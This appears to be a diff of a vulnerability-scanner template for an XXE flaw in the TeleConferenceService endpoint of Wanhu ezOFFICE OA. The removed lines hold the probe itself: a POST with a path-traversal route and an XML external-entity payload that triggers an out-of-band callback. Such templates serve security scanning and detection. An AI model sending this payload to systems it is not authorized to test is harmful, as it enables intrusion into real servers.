@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wanhu-oa-tele-conference-service-xxe
 
 info:
@@ -9,19 +10,3 @@ info:
     app="万户网络-ezOFFICE"
   reference:
     - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20TeleConferenceService%20XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
-
-set:
-  reverse: newReverse()
-  reverseURL: reverse.url
-rules:
-  r0:
-    request:
-      method: POST
-      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService
-      body: |
-        <?xml version="1.0" encoding="UTF-8" ?>
-        <!DOCTYPE ANY [
-        <!ENTITY xxe SYSTEM "{{reverseURL}}" >]>        
-        <value>&xxe;</value>
-    expression: reverse.wait(5)
-expression: r0()
